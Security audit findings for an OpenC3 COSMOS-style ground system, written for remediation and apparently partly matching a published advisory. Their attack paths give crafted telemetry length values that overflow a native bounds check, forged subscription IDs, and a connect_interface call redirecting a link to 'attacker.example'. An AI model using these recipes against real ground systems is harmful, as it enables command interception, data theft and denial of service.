findings.title: Critical-command approval (critical_commanding ALL) depends on a caller-controlled 'manual' flag
findings.description:
##### Overview

With a scope's `critical_commanding` set to `ALL`, the interface microservice holds a non-hazardous, non-restricted command for second-person approval only when the command message has `manual` true. `manual` is not derived server-side. It is a JSON-RPC keyword parameter (or the `Manual` HTTP header), defaults to `false`, and `cmd_api` copies it unchanged into the command message. Any user with `cmd` permission can call `cmd`/`cmd_no_range_check`/etc. directly through the API, or through the Ruby/Python client, and omit the header or send `manual: false`. The command then goes straight to the target with no approval record, defeating the two-person control that `ALL` mode is meant to enforce for operator-issued commands.

##### Attack Path

```
authenticated user --JSON-RPC cmd(...) without Manual header / manual:false--> _cmd_implementation (manual=false)
  --'manual' => 'false' in CMD topic--> interface_microservice: (@critical_commanding=='ALL' and manual) is false
  --> command written to interface with no CriticalCmdModel approval
```

`JsonRpcRequest.from_json` sets `keyword_params['manual']` only if the client sends the `Manual` header, so the client decides the value. `_cmd_implementation` checks `cmd` permission and forwards `manual.to_s`. The microservice creates an approval request only when `hazardous or restricted or (ALL and manual)`. The server has no independent signal to tell a direct operator command from an automated one.

##### Preconditions

- The scope has `critical_commanding` set to `ALL` (Enterprise feature).
- The attacker has a valid token with `cmd` permission for the target/packet.
- The command is not hazardous or restricted. Those still require approval.
findings.recommendation: Do not rely on a client-asserted flag for approval gating. Under `critical_commanding == 'ALL'`, require approval for every non-released command. Alternatively, derive 'manual' server-side (for example, only commands carrying a server-issued script/process identity are exempt) and ignore `manual` from untrusted request headers or params.
findings.note:
Triage: P2 | exploitability: moderate | impact: medium | owners from git history since 2024 (no CODEOWNERS file)
Label: new/unverified.

Verified: interface_microservice.rb ~285-310 only requires approval under critical_commanding == 'ALL' when `manual` is true. `manual` is a caller-supplied keyword param (cmd_api.rb ~452/484/534), so a direct JSON-RPC cmd call with manual: false skips ALL-mode approval.
Hazardous/restricted commands still require approval regardless.
It only matters when the Enterprise ALL mode is enabled, and it needs a cmd token for the command.

Impact: medium (bypasses two-person control for non-hazardous commands). Exploitability: moderate (feature flag plus auth).
Fix is large: derive manual/automated provenance server-side, e.g. from the script-runner token, not from a request param.

findings.title: connect_router lets system_set users rebuild and persist routers with arbitrary constructor parameters
findings.description:
##### Overview

`connect_router(router_name, *router_params)` works like `connect_interface`. It checks only `system_set` (the TODO notes missing command authority). The caller's parameters are JSON-encoded to the router topic, parsed by the router microservice, used to build a new router instance (`@interface.class.new(*params)`), and persisted into `RouterModel['config_params']`. A non-admin user can re-point a router, which bridges external clients to the targets' command/telemetry streams, at an attacker-chosen host/port or listening port. Telemetry can then be forwarded to an attacker, and command injection can be exposed through an attacker-controlled router endpoint that relays commands into mapped targets.

##### Attack Path

```
JSON-RPC connect_router('ROUTER', attacker params) --authorize system_set only--> RouterTopic.connect_router(params)
  --> router microservice 'connect' JSON.parse(params) --> @tlm.attempting(*params) --> class.new(*params) + RouterModel persisted
  --> router forwards telemetry to / accepts commands from attacker endpoint
```

The authorization is interface-level `system_set` only. The microservice rebuilds and persists the router from the caller's params, so the change lasts and affects all targets mapped to the router.

##### Preconditions

- The deployment enforces RBAC (Enterprise), and the attacker holds `system_set` but not admin or command authority for the router's targets. In Core there is no escalation.
- The attacker knows the router name (readable via `get_router_names` with `system`).
findings.recommendation: Require admin (or a dedicated configuration permission) when `router_params` is non-empty, check command authority for the router's mapped targets (for both `connect_router` and `router_cmd`/`router_protocol_cmd`), and avoid persisting runtime overrides.
findings.note:
Triage: P1 | exploitability: moderate | impact: high | owners from git history since 2024 (no CODEOWNERS file)
Label: new/unverified.

Verified: connect_router (router_api.rb ~64-67) takes the same system_set-only, params-based rebuild path, shared attempting() in interface_microservice.rb ~605-628. It persists into RouterModel config_params.
An Enterprise system_set user can redirect a router to an attacker host. That host then receives the routed telemetry and can inject commands through the router.
Same root-cause pattern as sfind-53daf33c, but a separate API and model, so it is kept as its own finding.

Impact: high. Exploitability: moderate (Enterprise RBAC).
Fix: same as connect_interface.

findings.title: Signed int overflow in check_bounds_and_buffer_size bypasses the buffer bounds check (OOB read/write), reachable with crafted variable-length telemetry
findings.description:
##### Overview

The native `BinaryAccessor.read`/`write` compute `upper_bound = (bit_offset + bit_size - 1) / 8` using 32-bit signed `int`. If `bit_offset` is near `INT_MAX` (it still passes `FIX2INT`/`NUM2INT`), the addition wraps negative. Because `upper_bound` is then less than `buffer_length`, the item counts as in bounds. `lower_bound` is still about 268 M and `upper_bound` is about -268 M. The aligned readers (`read_aligned_16/32/64`), float `memcpy`, and `read_bitfield` then read memory about 256 MB before and after the Ruby string buffer. The same helper guards `binary_accessor_write`, which copies into `RSTRING_PTR + lower_bound`, so a write at such an offset corrupts the heap. For variable-length packets, every item after a `VARIABLE_BIT_SIZE` item moves by `length_value * length_bits_per_count`. `length_value` is read from the received packet itself. A crafted telemetry packet can therefore put the next item at bit offset 2147483640. That crashes the decom microservice (SIGSEGV, persistent DoS of telemetry processing) or, if the memory is mapped, publishes heap bytes as decommutated telemetry.

##### Attack Path

```
crafted TLM bytes (INST VARIABLE_ARRAYS, ARRAY1_LENGTH=268435435) --interface--> TLM topic
  --DecomMicroservice packet.buffer=--> Structure#recalculate_bit_offsets
  (ARRAY2_LENGTH.bit_offset = 160 + 8*268435435 = 2147483640, fits int)
  --decom read--> binary_accessor_read (FIX2INT ok)
  --> check_bounds_and_buffer_size: 2147483640+32-1 wraps -> upper_bound=-268435453 < buffer_length -> 'in bounds'
  --> read_aligned_32 reads buffer[-268435453] / buffer[268435455..268435456]
  --> SIGSEGV of decom microservice (DoS) or heap memory disclosed as telemetry
```

The decom microservice sets `packet.buffer` from the Redis message. For non-fixed-size packets this calls `recalculate_bit_offsets`, which adds `new_bit_size - original` to every later item. `new_bit_size` is `length_value * 8` from the attacker's length field, with no cap against the buffer size. The array item itself goes through the Ruby `read_array` and returns nil because it is out of bounds. The next fixed 32-bit item, `ARRAY2_LENGTH`, goes to the C `read` with offset 2147483640. The overflowed `upper_bound` passes the only upper-bounds check, and `read_aligned_32` indexes the buffer with both the huge positive `lower_bound` and the huge negative `upper_bound`. Any 16/32/64-bit integer, float, or non-8-bit bitfield placed after the variable item works the same way. On the write side, the same overflow reaches `memcpy(RSTRING_PTR(param_buffer) + lower_bound, ...)`.

##### Preconditions

- A target defines a packet with a `VARIABLE_BIT_SIZE` item whose length field can hold at least ~2^28 counts (for example a 32-bit UINT with the default 8 bits/count, as in the shipped demo INST/INST2 `VARIABLE_ARRAYS` and `JSONTLM` telemetry). At least one fixed-size item wider than 8 bits (numeric, float, or bitfield) must follow it.
- The attacker can deliver bytes that the interface identifies as that packet: a compromised or spoofed device, or network access to a UDP/TCP telemetry interface. Assumed exposure: unauthenticated at the device/link level. Paths through the authenticated API (inject_tlm, command decom) were not fully verified.
- The MRI native extension is in use (the default; not `OPENC3_NO_EXT`).
- The buffer is at least the packet's small `defined_length`, so `enforce_length` does not reject it.
findings.recommendation: Do the bounds arithmetic in 64-bit (`long long`/`int64_t`), or reject `bit_offset > INT_MAX - bit_size` before computing bounds. Also reject any `lower_bound >= buffer_length` and any `upper_bound < lower_bound`. As defense in depth, validate the computed variable size in `recalculate_bit_offsets`/`calculate_total_bit_size`: reject a packet when `length_value` is negative or when item offset plus size exceeds `buffer.length * 8`. Apply the same fix to `binary_accessor_write` and the bitfield helpers.
findings.note: Duplicate of sfind-d384fe99367b424fbccdda28b7f6be4f. Same overflow in check_bounds_and_buffer_size covering the read and write paths (structure.c ~421-445, ~470-600, ~958-1165). Label: matches published advisory GHSA-g7jg-9chv-jq9j / CVE-2026-92167.

findings.title: send_raw skips cmd_raw authorization when the interface has no mapped command targets
findings.description:
##### Overview

Ruby `send_raw` authorizes `cmd_raw` only once per entry in the interface's `cmd_target_names`. The only check before that is `get_interface`, which requires `system` (read) permission. If an interface has no command targets mapped (a telemetry-only mapping, or targets removed with `unmap_target_from_interface`), the loop never runs. Raw bytes then go to `InterfaceTopic.write_raw` without any `cmd_raw` check. The Python API does a single interface-level `authorize(permission="cmd_raw", interface_name=...)`, so the Ruby behavior is a divergence from the intended policy. Under role-based authorization, a user with only `system` permission can write arbitrary raw bytes to the device link.

##### Attack Path

```
POST /openc3-api/api {method: send_raw, params: [IFACE, bytes]} --JsonDRb whitelist--> send_raw
  --get_interface (permission 'system' only)--> interface['cmd_target_names'] == []
  --no cmd_raw authorize--> InterfaceTopic.write_raw --> interface_microservice @interface.write_raw(bytes) --> raw bytes sent to device
```

`send_raw` is on the API whitelist and is dispatched by `JsonDRb`. `get_interface` checks only `system`. The `cmd_raw` check is inside a per-target loop, so an empty `cmd_target_names` skips it. The interface microservice writes the raw bytes to the physical link whenever the interface is connected.

##### Preconditions

- Deployment uses real permission enforcement (the COSMOS Enterprise `authorize`). In Core, the fallback `authorize` only validates the token, and every authenticated user already has all permissions.
- The attacker has a valid token for a role with `system` permission but not `cmd_raw` on that interface.
- The target interface is connected and has an empty `cmd_target_names` (for example telemetry-only or unmapped targets). A user with `system_set` can create this state with `unmap_target_from_interface`.
findings.recommendation: Authorize `cmd_raw` unconditionally at interface level before writing (`authorize(permission: 'cmd_raw', interface_name: interface_name, ...)`), as the Python API does. Keep the per-target loop as an additional check.
findings.note:
Triage: P1 | exploitability: moderate | impact: high | owners from git history since 2024 (no CODEOWNERS file)
Label: new/unverified.

Verified: cmd_api.rb send_raw (~166-174) authorizes cmd_raw only inside `interface['cmd_target_names'].each`. The preceding get_interface (interface_api.rb ~47-48) does check authorize(permission: 'system'), so a valid token with system permission is still required.
When cmd_target_names is empty, no cmd_raw check runs, and InterfaceTopic.write_raw sends arbitrary bytes to the interface. An interface ends up with an empty list if it has no command targets, or after unmap_target_from_interface (interface_api.rb ~159+, system_set). There is no separate finding for that satisfier.

The raw bytes reach the physical target, bypassing cmd_raw RBAC and every command check.
Impact: high. Exploitability: moderate (a system token plus the empty-list interface state; it only matters under Enterprise RBAC).
Fix: always call authorize(permission: 'cmd_raw', interface_name:) at least once, regardless of mapped targets.

findings.title: connect_interface lets system_set users rebuild and persist interfaces with arbitrary constructor parameters
findings.description:
##### Overview

`connect_interface(interface_name, *interface_params)` requires only `system_set`. The TODO notes that command authority for mapped targets is never checked. The parameters are forwarded to the interface microservice, which JSON-parses them and runs `@interface.class.new(*params)`. It then writes them into the persisted `InterfaceModel['config_params']`, so the change survives restarts. A user who can connect or disconnect interfaces can therefore reconfigure the link. With `TcpipClientInterface`/`HttpClientInterface`/`MqttInterface`, the hostname/port can be changed so all operators' commands, and the telemetry trusted by the ground system, go through an attacker-controlled host (command interception/spoofing, SSRF from the operator container). With `FileInterface`, the command-write, telemetry-read, and archive folders can be changed, so arbitrary operator-container directories are read as telemetry and their files moved. Interface configuration is otherwise set only at plugin install (admin).

##### Attack Path

```
JSON-RPC connect_interface('INST_INT', 'attacker.example', 8080, ...) --authorize system_set only-->
  InterfaceTopic.connect_interface(params) --> interface_microservice 'connect' --> @tlm.attempting(*params)
  --> @interface.class.new(*params) + InterfaceModel config_params persisted --> link redirected / files read+moved
```

The API method checks only `system_set`, with no target command authority and no admin check. The microservice rebuilds the interface from the caller's params and stores them in the model, so the malicious configuration persists and applies to every user's commanding.

##### Preconditions

- The deployment enforces RBAC (Enterprise), and the attacker has a role with `system_set` but not admin/plugin-install rights or command authority for the mapped targets. In Core, every authenticated user is effectively admin, so there is no escalation.
- The attacker knows the interface name (readable with `system` via `get_interface_names`).
findings.recommendation: Require admin (or a dedicated interface-configuration permission) whenever `interface_params` is non-empty, and check command authority for every target mapped to the interface. Consider allowlisting which constructor parameters may be changed at runtime, and do not persist runtime overrides into the plugin model.
findings.note:
Triage: P1 | exploitability: moderate | impact: high | owners from git history since 2024 (no CODEOWNERS file)
Label: new/unverified.

Verified: connect_interface (interface_api.rb ~65-77) needs only system_set. It forwards caller params to the interface microservice (interface_microservice.rb ~112-117). attempting (~605-628) runs @interface.class.new(*params) and persists the params into InterfaceModel config_params, so the change survives restarts.
An Enterprise system_set user can repoint a TCP/UDP interface to an attacker host. That lets them intercept every command sent to the target, feed forged telemetry, or cut the link.

This finding is also an alternate entry link for the C OOB sink sfind-d384fe99 (forged telemetry from the attacker-controlled host).
Impact: high. Exploitability: moderate (Enterprise RBAC with system_set; no escalation in Core).
Fix: require admin for params-based reconnects, or validate params against the plugin definition.

findings.title: DISABLE_DISCONNECT is enforced only in the UI; disconnect_interface ignores it
findings.description:
##### Overview

Interfaces can be configured with `DISABLE_DISCONNECT` (`disable_disconnect` in InterfaceModel) to stop operators from disconnecting critical links. The only server-side use is reporting the flag in `get_all_interface_info` so the UI can hide the button. `disconnect_interface` checks only `system_set` and never consults the flag. Any user with `system_set` can drop a protected link through the API and cut command and telemetry for everyone.

##### Attack Path

```
JSON-RPC disconnect_interface('CRITICAL_INT') --authorize system_set--> InterfaceTopic.disconnect_interface --> link disconnected despite DISABLE_DISCONNECT
```

The flag is returned to clients only as display data. The API mutation path has no matching check, so the protection is purely client-side.

##### Preconditions

- The attacker has a valid token with `system_set` (in Core, any authenticated user).
- The target interface is configured with `DISABLE_DISCONNECT`.
findings.recommendation: In `disconnect_interface` (and `connect_interface` with params), load the InterfaceModel and raise if `disable_disconnect` is set, unless the caller has admin permission.
findings.note:
Triage: P2 | exploitability: moderate | impact: medium | owners from git history since 2024 (no CODEOWNERS file)
Label: new/unverified.

Verified: disconnect_interface (interface_api.rb ~65-77) sends the disconnect with no check of the interface's DISABLE_DISCONNECT setting. The flag is enforced only in the UI. A system_set token (any token in Core) can disconnect a protected link.

Impact: medium (authenticated DoS of the telemetry/command link). Exploitability: moderate.
Fix: enforce disable_disconnect server-side in disconnect_interface/disconnect_router.

findings.title: Unbounded VARIABLE_BIT_SIZE length reaches C BinaryAccessor; 32-bit overflow bypasses bounds check (heap OOB write / decom crash)
findings.description:
##### Overview

`VARIABLE_BIT_SIZE` makes an item's `bit_size` equal to `length_value * length_bits_per_count + length_value_bit_offset`. `length_value` is read from another field in the packet buffer. No code on the path caps the result, neither the parser nor `StructureItem#bit_size=` nor `BinaryAccessor`. The value goes into the C extension (`structure.c`). There, `check_bounds_and_buffer_size` computes `upper_bound = (bit_offset + bit_size - 1) / 8` in signed 32-bit `int`. If a 32-bit length field is chosen so that `bit_size` is just below `INT_MAX`, the sum wraps negative, `upper_bound < buffer_length`, and the size check passes.

- Write path: `binary_accessor_write` then runs `memset(RSTRING_PTR(buffer) + lower_bound + value_length, 0, byte_size - value_length)` with `byte_size` ≈ 2^28. That writes about 256 MB of zeros past the end of a packet-sized heap buffer, which corrupts the heap and crashes the interface or decom microservice (SIGSEGV).
- Read path: `binary_accessor_read` calls `malloc(string_length + 1)` with a negative length and raises `NoMemoryError`. That class is not a `StandardError`, so it escapes the decom loop's `rescue => e` and kills the decom microservice.

The shipped demo target `INST HYBRIDTLM` (`JSON_LENGTH 32 UINT` + `APPEND_STRUCTURE JSON ... VARIABLE_BIT_SIZE JSON_LENGTH`) meets the requirements.

##### Attack Path

```
(A) inject_tlm('INST','HYBRIDTLM', {JSON_LENGTH: L, JSON: 'x'})  [tlm_set]
  --interface_decom_common.handle_inject_tlm packet.write in hash order-->
  handle_write_variable_bit_size: bit_size = bit_offset + L*8 - buffer_bits  (≈2^31-8)
  --BinaryAccessor.write (C)--> upper_bound wraps negative, check passes
  --memset(buf+off, 0, ~256MB)--> heap overflow -> interface/decom microservice crash

(B) device/network sends HYBRIDTLM with JSON_LENGTH = 0x0FFFFFFF
  --decom: packet.decom -> handle_read_variable_bit_size--> bit_size=2147483640
  --binary_accessor_read (C)--> wrap -> malloc(negative) -> NoMemoryError
  --escapes `rescue => e` in DecomMicroservice#run--> decom microservice DIED_ERROR
```

Path A: `inject_tlm` checks only that the item names exist and are valid states. The microservice then writes `item_hash` in order, so the attacker's `JSON_LENGTH` is already in the buffer when `handle_write_variable_bit_size` computes `current_bit_size`. It sets `item.bit_size = -bits_after_item`, a large positive value that fits in an int, so `NUM2INT` accepts it. `bit_offset + bit_size - 1` then overflows. Path B: `DecomCommon.decom_and_publish` rescues `Exception` only around `packet.process`. The later `TelemetryDecomTopic.write_packet` calls `packet.decom`, which reads every item and is outside that rescue. Commands are not affected, because `Commands#set_parameters` refuses user-supplied values for auto-managed length fields.

##### Preconditions

- The target definition has a `VARIABLE_BIT_SIZE` STRING/BLOCK/STRUCTURE item whose length field can hold values near 2^28 (≥29-bit, e.g. the demo `INST HYBRIDTLM` 32-bit `JSON_LENGTH`/`CBOR_LENGTH`), and the target uses the Ruby C-extension BinaryAccessor (default for Ruby microservices).
- Path A: authenticated user with `tlm_set` permission on that target (in Core, any authenticated user).
- Path B: ability to send telemetry bytes on that target's interface, e.g. a compromised or spoofed device, or network access to a UDP/TCP telemetry port. No COSMOS credentials needed.
- The operator may restart crashed microservices, so impact is repeated DoS. Heap corruption beyond a crash is not demonstrated because the overflow is a huge fixed zero-fill.
findings.recommendation: (1) In `structure.c`, compute bounds in 64-bit (`long long`) or check for overflow before adding (`bit_size > INT_MAX - bit_offset` → raise), and reject `string_length <= 0`/negative sizes before `malloc`/`memset`/`memcpy`. (2) In `BinaryAccessor#handle_read_variable_bit_size`/`handle_write_variable_bit_size` and `Structure#calculate_total_bit_size`, check that the computed size is non-negative and fits in the remaining buffer (`bit_offset + size <= buffer.length * 8`), and raise a `StandardError` otherwise. (3) Rescue `NoMemoryError`/`Exception` around `packet.decom` in the decom path, or keep the C layer from raising it for bad input.
findings.note: Duplicate of sfind-d384fe99367b424fbccdda28b7f6be4f. Same root cause: the unbounded VARIABLE_BIT_SIZE length (packet_config.rb / structure.rb) supplies the operand that overflows check_bounds_and_buffer_size in structure.c. The write-path memset variant (structure.c ~1080-1087) is recorded on the canonical finding. Label: matches published advisory GHSA-g7jg-9chv-jq9j / CVE-2026-92167.

findings.title: get_packets trusts caller-supplied subscription ID, bypassing per-target/per-scope telemetry authorization
findings.description:
##### Overview

`subscribe_packets` authorizes `tlm` separately for each requested target/packet and then returns a subscription ID. That ID is just `topic____offset____topic____offset...` in plaintext. `get_packets` does not check the ID's topics. It makes one scope-level `authorize(permission: 'tlm')` call with no `target_name`/`packet_name`, splits the ID it was given into Redis stream names, and `XREAD`s every one of them. Any caller who holds `tlm` permission in one scope can write their own ID naming any stream that has a `json_data` field. That includes `DECOM` telemetry streams for targets they are not allowed to see, `DECOMCMD` command-history streams (the command APIs gate these with `cmd_info`), and streams in other scopes (`OTHERSCOPE__DECOM__{TGT}__PKT`). The caller gets back the full decommutated packet contents. The Python implementation has the same flaw.

##### Attack Path

```
JSON-RPC get_packets(id="OTHERSCOPE__DECOMCMD__{SECRET_TGT}__CMD____0-0", scope: 'MYSCOPE')
  --authorize(tlm, scope=MYSCOPE, no target)--> passes
  --id.split('____') -> topic list--> Topic.read_topics(attacker topics, offsets)
  --XREAD arbitrary ephemeral streams--> decommutated tlm/cmd data returned to caller
```

`ApiController#api` sends the POST body to `JsonDRb#process_request`, and `get_packets` is on `Api::WHITELIST`. The only authorization check is against the caller-chosen `scope` and names no target or packet. The topic names come straight from `id` and are never checked against `scope`, the `__DECOM__` prefix, or the per-target authorization that `subscribe_packets` does. Offset `0-0` returns the whole retained history, up to `count` entries per stream, and the caller also controls `count`.

##### Preconditions

- Attacker has a valid token/session with `tlm` permission in at least one scope (`MYSCOPE`).
- Real impact needs an authorization backend with per-target or per-scope permissions (the COSMOS Enterprise `authorize` override loaded from `openc3-enterprise/utilities/authorization`). In the Core build in this repo, `authorize` only checks that the token is valid, so any authenticated user can already read everything. This rating assumes the Enterprise-style RBAC model the API is written for.
- Attacker knows or can guess target/packet/scope names (these can be enumerated, see the related LOW finding).
findings.recommendation: Re-validate every topic in `get_packets`. Parse each topic with a strict regex (`^#{scope}__DECOM__\{([^}]+)\}__(.+)$`), reject anything that does not match the caller's `scope` and the `__DECOM__` prefix, and call `authorize(permission: 'tlm', target_name:, packet_name:, scope:, token:)` for each extracted target/packet before calling `Topic.read_topics`. As an alternative, make the subscription ID opaque (HMAC-signed or stored server-side and tied to the user). Also clamp `count`. Apply the same change to `openc3/python/openc3/api/tlm_api.py`.
findings.note: Duplicate of sfind-c5f7771f3ae847039545348a20840e5b. Same root cause: get_packets trusts the plaintext topic____offset subscription ID and only does a scope-wide tlm check (openc3/lib/openc3/api/tlm_api.rb ~470-494). Label: new/unverified.

findings.title: Telemetry APIs resolve target/packet/item before authorize, giving unauthenticated callers a name-enumeration oracle
findings.description:
##### Overview

`tlm`, `tlm_raw`/`tlm_formatted`/`tlm_with_units`, `set_tlm`, `override_tlm` and `normalize_tlm` call `_tlm_process_args`/`_set_tlm_process_args` before `authorize`. Those helpers run `TargetModel.packet_item` (or `CvtModel.determine_latest_packet_for_item` for `LATEST`) and raise `"Packet 'X Y' does not exist"` / `"Item ... does not exist"` when the names don't resolve. `get_tlm_values` and `get_tlm_available` likewise look up `LATEST` before authorizing. JSON-RPC returns these messages to the caller as `OTHER_ERROR`. Names that do exist instead reach `authorize` and fail with `AuthError`/401. The difference lets an unauthenticated client, or one without permission on the target, confirm which targets, packets and items exist.

##### Attack Path

```
anonymous POST /openc3-api/api {method:'tlm', params:['TGT PKT ITEM']}
  --_tlm_process_args -> TargetModel.packet_item--> 'does not exist' error (OTHER_ERROR)
  vs existing name --> authorize --> AuthError 401
  --> oracle for the telemetry schema
```

`ApiController#api` has no authentication before_action, so authentication happens only inside `authorize`. Because the model lookup runs first, its error text reaches the client and reveals whether each name exists.

##### Preconditions

- Network access to the cmd-tlm-api JSON-RPC endpoint (no credentials needed).
- The information matters only where target/packet/item names are sensitive, or where per-target RBAC is supposed to hide restricted targets (Enterprise).
findings.recommendation: Authorize before resolving names. Call `authorize` at least at scope level (and at target level where the target is known) before `_tlm_process_args`, `determine_latest_packet_for_item` or model lookups, then authorize again for the resolved packet. Another option is to return one generic 'not found or not authorized' error.
findings.note: Duplicate of sfind-c29eb7f0461c412987ea3d5914a1a30b. Same root cause: _tlm_process_args/_set_tlm_process_args look up the target, packet, and item before authorize, so the error text reveals whether a name exists. Label: new/unverified.

findings.title: Signed int overflow in native bounds check lets a crafted variable-length telemetry packet cause out-of-bounds heap reads (and a huge memcpy) in BinaryAccessor.read
findings.description:
##### Overview

The native `BinaryAccessor.read` computes `upper_bound = (bit_offset + bit_size - 1) / 8` in 32-bit signed `int`. When an item's `bit_offset` sits within `bit_size` bits of `INT_MAX`, the addition overflows and wraps negative. `upper_bound` becomes negative, so the only guard (`*upper_bound >= buffer_length`) passes. `lower_bound` is still about +256 MiB. The aligned INT/UINT/FLOAT readers then dereference `buffer[upper_bound]` (about -256 MiB) and `buffer[lower_bound]` (about +256 MiB) outside the Ruby string. The big-endian bitfield path calls `memcpy` with a negative `num_bytes`, which becomes a huge `size_t`, into a small `malloc` buffer. Items that follow a `VARIABLE_BIT_SIZE` item get their `bit_offset` when the buffer is assigned, and that value comes straight from the length field inside the packet. Nothing compares it to the real buffer length. So one small crafted telemetry packet can push the next item's offset into the overflow window. The result is a segfault of the Ruby interface/decom microservice (the telemetry and command path for that interface goes down), or, if the addresses happen to be mapped, process heap bytes leak into the Current Value Table as telemetry values.

##### Attack Path

```
crafted 24-byte INST VARIABLE_ARRAYS packet (ARRAY1_LENGTH = 0x0FFFFFEB)
  --interface.read--> InterfaceMicroservice#handle_packet
  --> Telemetry#identify!/update! --> Packet#buffer= --> Structure#internal_buffer_equals
  --> recalculate_bit_offsets: adjustment = 8*L, ARRAY2_LENGTH.bit_offset = 160 + 8*L = 2147483640 (fits FIX2INT)
  --> calculate_total_bit_size(ARRAY2) --> self.read('ARRAY2_LENGTH') --> native binary_accessor_read(2147483640, 32, :UINT)
  --> check_bounds_and_buffer_size: 2147483640 + 32 - 1 overflows -> upper_bound = -268435453 (< buffer_length, check passes)
  --> read_aligned_32 reads buffer[-268435453], buffer[-268435454], buffer[268435455], buffer[268435456]
  --> SIGSEGV of interface microservice (DoS) or heap bytes returned as ARRAY2_LENGTH telemetry
```

The length item is read as a plain UINT32, so the attacker fully controls it. `calculate_total_bit_size` / `handle_read_variable_bit_size` multiply it by `length_bits_per_count` and never compare the result to `@buffer.length`. `recalculate_bit_offsets` adds that adjustment to every later item's `original_bit_offset`. `FIX2INT` only rejects values above `INT_MAX`, so an offset such as 2147483640 is accepted. In C, `bit_offset + bit_size - 1` then wraps negative. The negative `upper_bound` slips past the one-sided `>= buffer_length` check, and the read helpers index far outside the buffer. For big-endian bitfields that follow the variable item, `read_bitfield` computes `num_bytes = upper_bound - lower_bound + 1` (negative) and calls `memcpy(read_value, &buffer[lower_bound], num_bytes)`, overflowing a small heap buffer. The same OOB happens later in the decom microservice, whose `packet.buffer = msg_hash['buffer']` triggers the same recalculation. The Ruby fallback is not affected because Ruby Integers don't overflow; only the default native extension is.

##### Preconditions

- A Ruby-decommutated packet definition has a `VARIABLE_BIT_SIZE` STRING/BLOCK/array item followed by at least one fixed-position non-DERIVED item that is INT/UINT/FLOAT or a bitfield. The shipped demo `INST VARIABLE_ARRAYS` packet (ARRAY1_LENGTH, ARRAY1, ARRAY2_LENGTH, ARRAY2) meets this.
- The attacker can deliver bytes that get identified as that packet. Examples: network access to a TCP/UDP telemetry interface, a position on the target link, or a compromised/malicious target device. Alternatively, an authenticated user with `tlm_set` can call `inject_tlm` to set the length item, which reaches the decom microservice path.
- The native C extension is in use (the default on MRI; `OPENC3_NO_EXT` not set).
- The compiled code wraps on signed overflow. Formally this is UB, but the default `-O3` gcc code generation for this expression wraps.
findings.recommendation: Do the bounds math in 64-bit (`long`/`int64_t`) and reject negative values: compute `upper_bound = ((long)bit_offset + bit_size - 1) / 8` and fail if `lower_bound < 0 || upper_bound < 0 || upper_bound >= buffer_length || lower_bound > upper_bound`. Validate `num_bytes > 0` before every memcpy. Also, in `calculate_total_bit_size`/`handle_read_variable_bit_size`, reject (or clamp) length values whose resulting bit size or offset goes past `@buffer.length * 8`, so later item offsets can't be pushed beyond the real buffer.
findings.note:
Triage: P1 | exploitability: moderate | impact: high | owners from git history since 2024 (no CODEOWNERS file)
Label: matches published advisory GHSA-g7jg-9chv-jq9j / CVE-2026-92167 (heap OOB read). This is the canonical finding for the check_bounds_and_buffer_size signed-int overflow. It merges duplicates e558d8e2, e7d6e89a, b1bee593, 99b8c65f, 700394f5, e949b588. Profile rule: a C bounds-check bypass reachable from telemetry bytes is always HIGH.

Verified in source at 77acb91:
- structure.c ~421-445: upper_bound = (bit_offset + bit_size - 1) / 8 is computed in signed int, and the only check is one-sided (upper_bound >= buffer_length).
- structure.c ~280-302 and ~470-600: read paths do memcpy/indexing with the resulting bounds.
- structure.c ~1080-1087 (write path): memset(ptr + lower_bound + value_length, 0, byte_size - value_length), reachable via inject_tlm/set_tlm on VARIABLE_BIT_SIZE STRING/BLOCK items (binary_accessor.rb handle_write_variable_bit_size ~235-255).

- decom_microservice.rb run uses `rescue => e` (StandardError only), so a NoMemoryError from the huge-malloc variant, or a SIGSEGV, takes down the microservice.

Entry paths:
(a) Primary: link-level. One crafted telemetry packet on a TCP/UDP interface or target link; no COSMOS credentials needed.
(b) Authenticated inject_tlm (tlm_set). In Core, any valid token.
(c) Alternate chain via sfind-53daf33c (connect_interface): an Enterprise system_set user rebuilds a TCP client interface with an attacker host/port (interface_api.rb ~65-77, then interface_microservice.rb ~112-117 and attempting ~605-628, which does @interface.class.new(*params)). The attacker server then feeds the crafted packet. This alternate entry is harder than (a), so it does not raise the rating.

Impact: DoS of the interface and decom microservices, meaning loss of telemetry and limits monitoring for the target. Also possible heap-byte disclosure into the CVT, or heap corruption on the write path. No RCE was demonstrated.
Exploitability: moderate (needs link/network position or a valid token). Not P0 because it is not an unauthenticated single request against the internet-facing API.
Fix: 64-bit bounds math plus lower/negative checks in C, and cap variable lengths at buffer size in Ruby.
